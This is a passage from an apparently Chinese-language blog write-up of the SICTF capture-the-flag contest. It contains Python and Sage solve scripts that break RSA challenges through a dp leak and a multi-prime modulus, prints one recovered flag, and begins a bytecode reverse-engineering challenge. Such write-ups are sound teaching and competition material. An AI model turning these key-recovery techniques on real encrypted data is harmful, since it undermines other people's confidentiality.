6542402774020507531158198766149282993994638607458820211163623309687149807339960007614766879688676462400606899851539023671152038536934433128973358637812907001112093086713949701646964777013925616637956114825918525229968119306607256312727518429074253193934915609865400118400124334806320033990630595454381780378123232633134565408152216410478497582716891919477755736223636583493709691482948793995974775520709337409910573358960632077245564017495103173982250506224927848890977671698731337737945862469303397352291579706358090437359126171980555387033997507170208063868788685780633727495158542911276981383764698030088894904043298340184342818716278091407356551940358010532738356144600648671870141201656260882560550096111259047730234565173017875969390130055742832375612379167064701421263006004472414998830886590121784525812803198481744263349186310137594023961272959521982892804372412802448375074058059953851751721276448647238818757245128139844126234490887064897176175605991477364838775902549049484485649550475857257115219540606931472558004890564503134870490140656624241401747198540715275804941032074573356860460172868340373583692584902872979221114982298050586685719887060873413850621645519128954022253850929825608263273096476942591333367968509790925478388960974334157155990587259664085903377635645971389261554405014491809856113962072321115329323751880850245450855429733690986687462514539793256111238991830404264833945950057548041347552265351912075406068254301589527368376552057750656888595867048015012255350060023438752477068307445956245683183096512267217891149812719686622381240260466772552889788641876064057960173837664029586196731436456574414559972320705400861271592462379875676277251086312872195716024719468847393778892154498344296554136868868732950910162390521996660833516010868267341539744299603050842530651780425947531816479566426165422123252285427076862067553260240357395991463485011778125635347076641337205162163658915958257879189951068432591492287483129944125287963913713736174143726754563437013760958618334477377727596918588685928884428267449422751775309153821164066157157127578931430789782791432466972743083256930846560916380022935439074194208587413499830348721004306047843916090382879427208653946874404416581482497419737465638158237340330822703573665318917667360471294611610224794247546701801044290825387969994925735165223021550294577211312086169077389985367351707099712483698243658870007261177946508698830792080087400145468466457013023648585707831661968993789151545051681008263293021078693138432668411562842904645661356499891588207831214182852485507569391094080770281546830762172075737108196782354642073491890672014845707320966391491467609280627047834838773416130380735074488364271149543425149101272213833983451690912775914099688310078028317868139895586469648241691434390559738020665790535748911667198341478329818172050103593169144077713081858968945277802911631514524770516773987691162846774892828407010262766598402873965272708201519043339930474621748065360132998861911090097210247744181877811558047691563490093112810880988416880859363631693862441291401344868362517958157134815632633152101164792211199872770004214575342556751954753067436057216989105115974894826691301734658752554796336087163153087013755182247902851847839867807219615044427616326518986674768302109569955218389569458769985874451273117138435546665024826358058600551523916808015505037962468350942106702503883112975634757971636535249998962164886704286732345711210362931312187319836001555348202695806282730945501510756659164231139623277954192087899140537284122009070763979073048837471984618684020674370221463294306239424220412900401460550783283591789801735401367473630854684306273273881688896021682911944793729874921181848098382943970467341811398482121657330781393699096796050290808604481724879698091852697163383826854575487201365106673196811573729247280577781500366763330567122007588833805912087009446499739562463428568952248234506507069953596589309728265145195922268165106056450388840269349409588020300011340940321969965833519126936472969929255823540027083032424724503173052044192907375974391257436211908641463947719594493311129179150043015816776680636855703407557636501711566215605658114055289137679940955</span><br>e = <span class="hljs-number">19458216662993202562182929756256684791318810848802754020883513588583377528821730559897870095442161189229950925325157413999927847684731484753811988111830295294129447423655650029218971567158117911790213848402209470536199246476182240248742771389082526603384625792117047996128232952372477895218147279573573322975526303267821446640338606290250958710008158544852602338088244940388562828263436457418528981476220691508040085291576643321726669065360399003917048894093458055139757991688086912143763420958307099065105543361779847689716282373299487102518794317683805758527645283956734672229827240143254092779918701447288342107763</span><br><br><span class="hljs-comment">#************************************hint**************************************</span><br>M = libnum.<span class="hljs-title function_ invoke__">s2n</span>(hint)<br>P = <span class="hljs-title function_ invoke__">getPrime</span>(<span class="hljs-number">512</span>)<br>Q = <span class="hljs-title function_ invoke__">getPrime</span>(<span class="hljs-number">512</span>)<br>N = P * Q<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;N=&quot;</span> , N)<br>E = <span class="hljs-number">65537</span><br>dp = (gmpy2.<span class="hljs-title function_ invoke__">invert</span>(E,(P-<span class="hljs-number">1</span>)*(Q-<span class="hljs-number">1</span>)))%(P-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;dp=&quot;</span> , dp)<br>ct = <span class="hljs-title function_ invoke__">pow</span>(M, E, N)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;ct=&quot;</span> , ct)<br><span class="hljs-comment">#N= 154243858720978602820118866455277758287334223654318945323956633685668127012462551649034724900534326698546179107853501584676890290935304784613676008667655919749627682648852472398117930471389759979432279103098572267738634433626627146280660185675121614094399255782089060202532182667463993275434746386786808729553</span><br><span class="hljs-comment">#dp= 414447829724187823397808703878958757693775250832414113550357728233230359464880433113636330432984183165483109337095394192757735932571515450285102727598243</span><br><span class="hljs-comment">#ct= 107353143319003715532284973064969905174389167949274067058206046773012002421251301189097709121034091973243342582216724329271495555062882075119176838856174054763892910473175610614629226628025470613930226188506099489500606701109022668507012376482339056160636468427364776216626364765166621843217027512464383836160</span><br></code></pre></td></tr></table></figure><p>hint是dp泄露，先跑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">import libnum<br><br>n= <span class="hljs-number">154243858720978602820118866455277758287334223654318945323956633685668127012462551649034724900534326698546179107853501584676890290935304784613676008667655919749627682648852472398117930471389759979432279103098572267738634433626627146280660185675121614094399255782089060202532182667463993275434746386786808729553</span><br>e= <span class="hljs-number">65537</span><br>c= <span class="hljs-number">107353143319003715532284973064969905174389167949274067058206046773012002421251301189097709121034091973243342582216724329271495555062882075119176838856174054763892910473175610614629226628025470613930226188506099489500606701109022668507012376482339056160636468427364776216626364765166621843217027512464383836160</span><br>dp= <span class="hljs-number">414447829724187823397808703878958757693775250832414113550357728233230359464880433113636330432984183165483109337095394192757735932571515450285102727598243</span><br><br>p=gmpy2.<span class="hljs-title function_ invoke__">gcd</span>(<span class="hljs-title function_ invoke__">pow</span>(<span class="hljs-number">2</span>,e*dp,n)-<span class="hljs-number">2</span>,n)<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">1</span>, e):<br>    p = (dp * e - <span class="hljs-number">1</span>) <span class="hljs-comment">// i + 1</span><br>    <span class="hljs-keyword">if</span> n % p == <span class="hljs-number">0</span>:<br>        q = n <span class="hljs-comment">// p</span><br>        <span class="hljs-keyword">break</span><br>phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = gmpy2.<span class="hljs-title function_ invoke__">invert</span>(e, phi_n)<br>m = <span class="hljs-title function_ invoke__">pow</span>(c, d, n)<br>flag = libnum.<span class="hljs-title function_ invoke__">n2s</span>(<span class="hljs-keyword">int</span>(m))<br><span class="hljs-keyword">print</span>(flag)<br><span class="hljs-comment">#Alpha == 8</span><br></code></pre></td></tr></table></figure><blockquote><p>代入计算， n约等于 (8<strong>16)*(128</strong>32)*(4096**2)*p**58，只有一个未知数p，解方程可以得到一个在p附近的数，在这个数的前后爆破一下即可得到p。p的长度为512bit大于flag的长度，所以RSA模p</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">import gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> sympy import *<br>n = <span class="hljs-number">510598540378970007468346322989879190780475356832709189528874695730531468123747091318830966440138615736420891392158097533731041150162690662471483619765171875053776526546923686545162088172326434280369545887080098691661618888498451216122577703462656147845476260802989936275927468143618457014875124540773380472942489037761179303561650189545290190421786318533073909424735517884608967725919128200358535113829753453601297612782921831305721998858231417374167746154206561475003022801732102170674160043866579234096945753255309604584663823273990392197858273029361669185072049422597132579136784027822968387907216366150999438414498332890674564920800382005582891491049365978733797356415518435343495821039314228388769356638637099572998812062355774848959446125701462950655806332002764535951282449862140062574418031213788534096501985200284615865248974807525604893147298611402252296159828500266098282909607218395957805357667923653409828275804406466185333491486073920384298557332939701611488655278812282652143513835104674009767479927241052662403578967182673338296967573503287747778401579267126898937724971226916836862238412923209155792382534204896050548824028658237640251964366961727999178646613907934616655737902329568420682808750546571786374023614255135110482419627491157502417864563832543812083026753673687664854910877686333766643694031564516722983669199704788291656757271915091399977189663329054202997146978631991467923388119989473941572476162990901960011968892272676827771256008656450296183884491251752111424531449198118292179798490440493223653950102915889401116251591885909790869073018774674246846164536910633015902964911907187085243240032540938841961345835517368130042501382327926289017383981908729734129193302049155793436988510517701765733605569135643208447952662352778482137713239592896997102366230279153456455232519301534222340901671138239539845240151878610363390683459663471954623868659324304077587611084188341121303918876492043578883059738615210439439368338460631574255417822627815523601923537626576677004085017875860928802762176477815284840936951142176532768517728636562256240668409525184886142801802825451465440993457022771077957094228957592122319682216294509338262739872163482972508991702525289361105971574659126127296233247905505496525683817711366704746617027744889413904684867577081667137187623825349410229389484199608739864221035985277681307389939848405790294473878622092200837753161101695539947514614727699952200114544362051873938505591469240465379091377837297561323297393518152524513948294475770774872596601345526469590486037386767964812631618224527233850818909346007449756779707319609915127618828551910681421647307180399632857248867655836894968134457622987954781685664833951774981383914013420724637676787907498490619865488706542422141338754933476190313653530739822029700217857534243473680585150263523947891501341441371965435851479670882202992955935279933652356336270251591324623898094984119190752775236005057405257945038031382867511822173122001309505728526596893926445291712035117553637589190292816001770554129840326832888707541999454791653742647879694585329112697382151447923691770809327807665376014114552626285289291808032845544905356380497227622738746307685611140483875177839511922977657045680353723672792411661489242162646272105649970359134277499907207906149573299990033858943215801954126448693460102775418225293255402758159431943811872373682053160944887775375465971432320964554947377318554518275854303099420999992690990916801757184853847474379621177976926681977371922191722085164910430032177320954341986984523594583172470609743970245810969858512632597943721628165724329447516823159387734220282510185959768239630017162115072758419177056571781075148374822721899683720488356041096248563880547752710289151512607087038310649235610688255059182467964379544134070766646863815775576049106337955345150055151813028534690066771104188418296440067303355417210829440978858599306487361626723932883675404705319649877631289465547597225908934420304867048341698308940436377375588905463549199568800788130324653074398891097223958392703515180958466771395566567923630440881986781120062769327993137151783189811570714391264155060840731029466593405853721833971303821804104382800673631786729744779165371433211267361024896576031556979771007693215198547296582235167582106419779580693225211695215406540025468141235241168387527901851774993867055740692835931115312659500713701652905802357951993290979099170159167009106534001226859533836082801229997337966972579186548771169099646656172882424089451273021293821026173210665095782802709874946641962115525841325300318524665386511421662860490620819561338110623774842340380068922415609137358448899126553279894950604871889208579886778999174405582160576479554324208876082033912031737086248121899303730781498156597249803927142235444644481388064486155431912003641095674949903404176810866307571531389637794147871012904134653569388493652441432759092336752228939764110397029831387803943394811558386122839568158928461007578259968765727092577006588264867960486472014493774664081407186721351852883527145790575242285664659303948842228766554243966691396492391152581830022133814454196259968655735361775914705332258892954614272244452518449260489348504449204461418971768011384340273291232094176572232837038670467853897665877851434992557429017504229337778470080893449423405491607587635438331476572996201482633587271479001915768182336813417460145272910780420062773057289352127058606048428315185624554551172152106354445240590380140756355226376829443068190672329776832112173322011137862590548721676059398379694994522794474774534579546109677615257696703950497332824299576069196330271666459758430542051969093680846765661685489556479825015505460585577388300005030240514448617715276600874290664416888184557142542207029827016362686924883704397874129412267949416733492080843315519912943048041880665442664534980370689081266908497051077237188221752059058912835617635691061804481035908317765279937217591432632832678806430381325340000898958680468694182993189208039459712391492410123386884340504648296815916980264240229859574883155040793388439699245314010536014311134726579595932201351264754211113984594974123575279085420654342347792446273359397655783349850267895960713020361459104930811498666622216299579774939159380045958811891996366190154624989040001455252320159516822116133341010157165599727635333348456688307169980804760876207246783116588952529877373514768545007418968307885769960168050996962066803264260375707466369627458024513973771207018864983698407016663019106354023164759250846073414341438963394719456500998324900154652118420207057668806120330181700845296117532235012372135050553397046174401449323031309344766628888675704109715329046692002106076405553528413866402862565543443907259825033515101841485790388106868972724754988229771779715569516295419556055234476868558577442887306482605945053829666543946452255290321024138948999088611233226734197091325915223296133751626031378197131875533631358612215053149934608672729194446883476706267066475008836864936670808320239466055935088929279252129128009704233352664523535820092988950793050907265677092793104426094212209504897403359406325045852228354350509453013015487815230129380079713113632363881496974185547766115624580099624722897692297760495094913178120692467666707678647081180656345151015995338390986674404981831649353833607305738823436744297628382797810952028446046016233612873716789383675779820186248250486000672269630344269347652027789034023080859790238772676504723029078903218723114249502157501775936110552413022658586833869562215506206204712447588632398550497708640229614956652263449460598992811393334042395804931240940416629178335447861485028284981615219874331354750385150254017244750993573994159458909546341067039268159319391512934162794663414200907868505060542602841564239761181077333990423542820064315891665379550720216448942932714180923613869070005330476506812100063599659432570925437054287120906048730323556681557905787470647037629769660028387819741611799183349496549168370221978146678987457271259655273299546276899538032070218474555442304430064164467753804089753466882786069297036926063093020795423414152340563079346797084488827259011515774643776620378827875819192074121522712821147817374988804339999134520633699074448564057555026364304855373068414955699295158212425760345481057281658337956841137897162198027254556350868502178340964817530029135654659162400076087528650997151875596189190736466304722028587441680622878918057024286243448077104494316372739218635221411755498456912672491099154558604384574583302548226057069534004474532514444674565766058970748694657151540644416463532338966570743112669782840065402131461088637463019996192189423665651801811614499041923273110971446683450048861113332787126098622974613883291506736280588039145040361795192519576202306796277888696719887642051327259799873478040156450250036778305950744573270786882726162630115640020293415918210448873867037875790399234972055537649774407094382744621251926131880807765203843946682834221238903263352845265134368550124026502981782369374484091775137498831749984649699756860976525160646445060537001</span><br>c = <span class="hljs-number">25311588269686177955448734593829241225577179988164713941852977611031657483354358211703127234256857543045931490595235462694154500286504335321863566904591526587164297277540588019404183750093303030110155964308233155625979213391426577001127732161793532171930032372311485789800839135378584125843945003217786635500780784536181313697728354510921343049319891609423580951127082479154042124088536642353812516362473763243425336498681024731131013712158320926550826023277898283823992258572884077276506953901984370413493389421701244517177275694290580595883324705204426546600360091062972293159479880268240701929584137714053692704173792703744319619320692061092061615202753943135058204637610994232168818081462863915909261100211958674543647005416235222620606212841753586419836448681445654681389951211124603287962397164672343026391101395393442103086256726266031275710666309840451443110824175976964355109239201609721120961810198879456321855222352235065257082872600438604687617267718725588993464084147695037610145634237788526691386358596867368523164061114195245860062033244276270480267737617206612775486335779851309426638789250166900931784751600508190450785806340839297468432626354823268011108399699249876358363866293469899572158837757748629586492339783888456600259136387616777593894789302431752391447333278000811521062096467397501227651566498970779080811188805992370970942403208432494393387894197176720244315639559895616799551357601688597541585709039366190088117378880414928532937085490713336140523926983900188378021593225550131993528275166272215028510435690944582596557549068715312515919059333916941744937308255671959764859162487792658274812322891679161915480098864709106347357292015949882243095564999283630289876842913558415205967734452657944991350268108202225952952066459093168792825684626405271617613362070897142103054139806566495183172335794957308822648116537830567396971238329939142829563169355194093529211071160078683833491919940022871862059981346961003867620542620578917684687869682550269127226291011607064545739386850054846167307744022708831833252517778607796258598290908139274345221343651583618249287308738279011682960787460189183445095638164116734700624496711487227176740828397696295620232796356005136058517828311139839381424066302086111930635998143063033446131859852797958765199173807715541045956108285596958780742834805533223538366354327087736088500599094358107164689423572964793385788194218918919596478862097292477628426360333874314260108133339375942666508606311391805252966277961758108821946154428477616100004321457604879220523742427633323872953699931521980332026241531049474031438142792394628576016121322036294740176980189940853036679375845577017978783071015970829136676221389585848058189544793760570196797629432282672371000290840492119720433350192833648839794730598188620374416865232426658538841900897108162173580739323675324880778494924038982358349531848197090990541020708295116156624389135273650491811601011636903928586011504526431498652011548693157985029456398851189821020778958527809174433156243544030624341915713810661287037659586018768085470670240790942171506843637271442721823608266490364627429331023698199955218456371716269004979764982383921294842864121196124699402037204598504310969390789092001114319822852242500941141355281693725110460506548426263105213498404197519606615831672853931646583757742145492562101250546593997874586076926641241047317510838024042147508770595175718146175716833867781581245298658392175502069483979736336330731124942036757071709086638075284655589787868565023763734664219353940143820183318534640360506287779208468427268377183973501528333749816003855834863565394122448191029578528511650194632623989208637401008114422451686312319644054514944700566430912835340518601698767128195833704182657730566589247891277627101027106635732998136735398078858899384713118593668984773592904704131402905145754570091966901120411201405256435232063295790833161132002246279663161388421997242226907126829858922174709653627696146355472690262198127338971112610753839661677080463775112411884196230185877234066728564716929551607129141735155379529048300204700285511666205204686244751557147684338591300111406075976759988295937870045743031816067994768915303111125253664865369863586807234945352445045026501495849671447691502253489642657652848949102823407762108943161789244134119866441040670840037015617307056821150285453994199024947457774647253618512995677313792036106100497936654142008173389260345411854520383366800831542339243757421033121103167943520915885043698882609693007629591093225819727653240183003450339802857059736870645197609170799838610316307123146927966669912638227587517396282910946355194781275415343491170583392480153599086125374051844306869510079152461763122622668280249192047024784624692776244265874153473114993619019113474166958126841368545758693832786756946298833891033171752534079387364641021835311861509609494125593285947444939996542402774020507531158198766149282993994638607458820211163623309687149807339960007614766879688676462400606899851539023671152038536934433128973358637812907001112093086713949701646964777013925616637956114825918525229968119306607256312727518429074253193934915609865400118400124334806320033990630595454381780378123232633134565408152216410478497582716891919477755736223636583493709691482948793995974775520709337409910573358960632077245564017495103173982250506224927848890977671698731337737945862469303397352291579706358090437359126171980555387033997507170208063868788685780633727495158542911276981383764698030088894904043298340184342818716278091407356551940358010532738356144600648671870141201656260882560550096111259047730234565173017875969390130055742832375612379167064701421263006004472414998830886590121784525812803198481744263349186310137594023961272959521982892804372412802448375074058059953851751721276448647238818757245128139844126234490887064897176175605991477364838775902549049484485649550475857257115219540606931472558004890564503134870490140656624241401747198540715275804941032074573356860460172868340373583692584902872979221114982298050586685719887060873413850621645519128954022253850929825608263273096476942591333367968509790925478388960974334157155990587259664085903377635645971389261554405014491809856113962072321115329323751880850245450855429733690986687462514539793256111238991830404264833945950057548041347552265351912075406068254301589527368376552057750656888595867048015012255350060023438752477068307445956245683183096512267217891149812719686622381240260466772552889788641876064057960173837664029586196731436456574414559972320705400861271592462379875676277251086312872195716024719468847393778892154498344296554136868868732950910162390521996660833516010868267341539744299603050842530651780425947531816479566426165422123252285427076862067553260240357395991463485011778125635347076641337205162163658915958257879189951068432591492287483129944125287963913713736174143726754563437013760958618334477377727596918588685928884428267449422751775309153821164066157157127578931430789782791432466972743083256930846560916380022935439074194208587413499830348721004306047843916090382879427208653946874404416581482497419737465638158237340330822703573665318917667360471294611610224794247546701801044290825387969994925735165223021550294577211312086169077389985367351707099712483698243658870007261177946508698830792080087400145468466457013023648585707831661968993789151545051681008263293021078693138432668411562842904645661356499891588207831214182852485507569391094080770281546830762172075737108196782354642073491890672014845707320966391491467609280627047834838773416130380735074488364271149543425149101272213833983451690912775914099688310078028317868139895586469648241691434390559738020665790535748911667198341478329818172050103593169144077713081858968945277802911631514524770516773987691162846774892828407010262766598402873965272708201519043339930474621748065360132998861911090097210247744181877811558047691563490093112810880988416880859363631693862441291401344868362517958157134815632633152101164792211199872770004214575342556751954753067436057216989105115974894826691301734658752554796336087163153087013755182247902851847839867807219615044427616326518986674768302109569955218389569458769985874451273117138435546665024826358058600551523916808015505037962468350942106702503883112975634757971636535249998962164886704286732345711210362931312187319836001555348202695806282730945501510756659164231139623277954192087899140537284122009070763979073048837471984618684020674370221463294306239424220412900401460550783283591789801735401367473630854684306273273881688896021682911944793729874921181848098382943970467341811398482121657330781393699096796050290808604481724879698091852697163383826854575487201365106673196811573729247280577781500366763330567122007588833805912087009446499739562463428568952248234506507069953596589309728265145195922268165106056450388840269349409588020300011340940321969965833519126936472969929255823540027083032424724503173052044192907375974391257436211908641463947719594493311129179150043015816776680636855703407557636501711566215605658114055289137679940955</span><br>e = <span class="hljs-number">19458216662993202562182929756256684791318810848802754020883513588583377528821730559897870095442161189229950925325157413999927847684731484753811988111830295294129447423655650029218971567158117911790213848402209470536199246476182240248742771389082526603384625792117047996128232952372477895218147279573573322975526303267821446640338606290250958710008158544852602338088244940388562828263436457418528981476220691508040085291576643321726669065360399003917048894093458055139757991688086912143763420958307099065105543361779847689716282373299487102518794317683805758527645283956734672229827240143254092779918701447288342107763</span><br><br>np = (<span class="hljs-number">8</span>**<span class="hljs-number">16</span>)*(<span class="hljs-number">128</span>**<span class="hljs-number">32</span>)*(<span class="hljs-number">4096</span>**<span class="hljs-number">2</span>)<br>p = gmpy2.<span class="hljs-title function_ invoke__">iroot</span>(n//np,<span class="hljs-number">58</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">while</span> True:<br>    p = <span class="hljs-title function_ invoke__">prevprime</span>(p)<br>    d = gmpy2.<span class="hljs-title function_ invoke__">invert</span>(e,p-<span class="hljs-number">1</span>)<br>    m = <span class="hljs-title function_ invoke__">pow</span>(c,d,p)<br>    flag = <span class="hljs-title function_ invoke__">long_to_bytes</span>(m)<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&quot;SICTF&#123;&quot;</span> in flag:<br>        <span class="hljs-keyword">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-comment">#SICTF&#123;6ee93ffd-e903-49d6-b166-44680a294851&#125;</span><br></code></pre></td></tr></table></figure><h4 id="xy"><a href="#xy" class="headerlink" title="xy"></a>xy</h4><p>解方程平方和，sage上的函数 two_squares() 可以求出x,y</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#sage</span><br>enc = <br>x_y= <span class="hljs-title function_ invoke__">two_squares</span>(enc)<br><span class="hljs-keyword">print</span>(x_y)<br></code></pre></td></tr></table></figure><p>不会写交互，手撸<br><img src="/mdimg/sictf/37.png"></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h4 id="LiHua’s-checkme"><a href="#LiHua’s-checkme" class="headerlink" title="LiHua’s checkme"></a>LiHua’s checkme</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>           <span class="hljs-number">0</span> LOAD_CONST               <span class="hljs-number">0</span> (<span class="hljs-number">114433</span>)<br>            <span class="hljs-number">2</span> LOAD_CONST               <span class="hljs-number">1</span> (<span class="hljs-number">114459</span>)<br>            <span class="hljs-number">4</span> LOAD_CONST               <span class="hljs-number">2</span> (<span class="hljs-number">114449</span>)<br>            <span class="hljs-number">6</span> LOAD_CONST               <span class="hljs-number">3</span> (<span class="hljs-number">114438</span>)<br>            <span class="hljs-number">8</span> LOAD_CONST               <span class="hljs-number">4</span> (<span class="hljs-number">114452</span>)<br>           <span class="hljs-number">10</span> LOAD_CONST               <span class="hljs-number">5</span> (<span class="hljs-number">114473</span>)<br>           <span class="hljs-number">12</span> LOAD_CONST               <span class="hljs-number">6</span> (<span class="hljs-number">114480</span>)<br>           <span class="hljs-number">14</span> LOAD_CONST               <span class="hljs-number">7</span> (<span class="hljs-number">114530</span>)<br>           <span class="hljs-number">16</span> LOAD_CONST               <span class="hljs-number">8</span> (<span class="hljs-number">114531</span>)<br>           <span class="hljs-number">18</span> LOAD_CONST               <span class="hljs-number">9</span> (<span class="hljs-number">114487</span>)<br>           <span class="hljs-number">20</span> LOAD_CONST              <span class="hljs-number">10</span> (<span class="hljs-number">114528</span>)<br>           <span class="hljs-number">22</span> LOAD_CONST              <span class="hljs-number">11</span> (<span class="hljs-number">114483</span>)<br>           <span class="hljs-number">24</span> LOAD_CONST               <span class="hljs-number">8</span> (<span class="hljs-number">114531</span>)<br>           <span class="hljs-number">26</span> LOAD_CONST              <span class="hljs-number">12</span> (<span class="hljs-number">114484</span>)<br>           <span class="hljs-number">28</span> LOAD_CONST              <span class="hljs-number">13</span> (<span class="hljs-number">114559</span>)<br>           <span class="hljs-number">30</span> LOAD_CONST               <span class="hljs-number">7</span> (<span class="hljs-number">114530</span>)<br>           <span class="hljs-number">32</span> LOAD_CONST              <span class="hljs-number">14</span> (<span class="hljs-number">114539</span>)<br>           <span class="hljs-number">34</span> LOAD_CONST              <span class="hljs-number">15</span> (<span class="hljs-number">114532</span>)<br>           <span class="hljs-number">36</span> LOAD_CONST              <span class="hljs-number">16</span> (<span class="hljs-number">114486</span>)<br>           <span class="hljs-number">38</span> LOAD_CONST              <span class="hljs-number">13</span> (<span class="hljs-number">114559</span>)<br>           <span class="hljs-number">40</span> LOAD_CONST              <span class="hljs-number">17</span> (<span class="hljs-number">114534</span>)<br>           <span class="hljs-number">42</span> LOAD_CONST              <span class="hljs-number">12</span> (<span class="hljs-number">114484</span>)<br>           <span class="hljs-number">44</span> LOAD_CONST              <span class="hljs-number">16</span> (<span class="hljs-number">114486</span>)<br>           <span class="hljs-number">46</span> LOAD_CONST              <span class="hljs-number">18</span> (<span class="hljs-number">114538</span>)<br>           <span class="hljs-number">48</span> LOAD_CONST              <span class="hljs-number">13</span> (<span class="hljs-number">114559</span>)<br>           <span class="hljs-number">50</span> LOAD_CONST              <span class="hljs-number">18</span> (<span class="hljs-number">114538</span>)<br>           <span class="hljs-number">52</span> LOAD_CONST              <span class="hljs-number">12</span> (<span class="hljs-number">114484</span>)<br>           <span class="hljs-number">54</span> LOAD_CONST              <span class="hljs-number">14</span> (<span class="hljs-number">114539</span>)<br>           <span class="hljs-number">56</span> LOAD_CONST              <span class="hljs-number">19</span> (<span class="hljs-number">114535</span>)<br>           <span class="hljs-number">58</span> LOAD_CONST              <span class="hljs-number">13</span> (<span class="hljs-number">114559</span>)<br>           <span class="hljs-number">60</span> LOAD_CONST              <span class="hljs-number">20</span> (<span class="hljs-number">114533</span>)<br>           <span class="hljs-number">62</span> LOAD_CONST               <span class="hljs-number">9</span> (<span class="hljs-number">114487</span>)<br>           <span class="hljs-number">64</span> LOAD_CONST              <span class="hljs-number">21</span> (<span class="hljs-number">114529</span>)<br>           <span class="hljs-number">66</span> LOAD_CONST              <span class="hljs-number">18</span> (<span class="hljs-number">114538</span>)<br>           <span class="hljs-number">68</span> LOAD_CONST              <span class="hljs-number">18</span> (<span class="hljs-number">114538</span>)<br>           <span class="hljs-number">70</span> LOAD_CONST              <span class="hljs-number">16</span> (<span class="hljs-number">114486</span>)<br>           <span class="hljs-number">72</span> LOAD_CONST              <span class="hljs-number">15</span> (<span class="hljs-number">114532</span>)<br>           <span class="hljs-number">74</span> LOAD_CONST              <span class="hljs-number">14</span> (<span class="hljs-number">114539</span>)<br>           <span class="hljs-number">76</span> LOAD_CONST              <span class="hljs-number">17</span> (<span class="hljs-number">114534</span>)<br>           <span class="hljs-number">78</span> LOAD_CONST              <span class="hljs-number">14</span> (<span class="hljs-number">114539</span>)<br>           <span class="hljs-number">80</span> LOAD_CONST               <span class="hljs-number">8</span> (<span class="hljs-number">114531</span>)<br>           <span class="hljs-number">82</span> LOAD_CONST               <span class="hljs-number">8</span> (<span class="hljs-number">114531</span>)<br>           <span class="hljs-number">84</span> LOAD_CONST              <span class="hljs-number">22</span> (<span class="hljs-number">114479</span>)<br>           <span class="hljs-number">86</span> BUILD_LIST              <span class="hljs-number">43</span><br>           <span class="hljs-number">88</span> STORE_NAME               <span class="hljs-number">0</span> (flags)<br><br><span class="hljs-number">2</span>          <span class="hljs-number">90</span> LOAD_NAME                <span class="hljs-number">1</span> (<span class="hljs-built_in">input</span>)<br>           <span class="hljs-number">92</span> 